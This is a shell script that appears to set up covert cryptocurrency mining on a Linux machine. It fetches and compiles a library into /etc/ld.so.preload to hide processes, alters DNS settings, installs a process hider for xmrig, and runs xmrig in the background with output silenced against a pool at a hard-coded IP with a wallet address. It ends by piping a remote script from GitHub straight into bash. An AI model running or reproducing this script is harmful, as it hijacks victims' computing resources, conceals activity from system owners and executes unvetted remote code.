#!/bin/sh
sudo apt update
sudo apt install screen -y
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add xmrig"
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz >/dev/null 2>&1
tar -xf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
./xmrig -a rx/0 -o 165.245.179.15:443 -u 125Jbun61Pizt3cwSDLAV8fgxdQP1miPNsWzPW3dABF3wpdAXf8gQcNjESJuy8r9ipG6JwvpcoV5ivhYUZyCRad6YWQ."0$RANDOM" -k >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
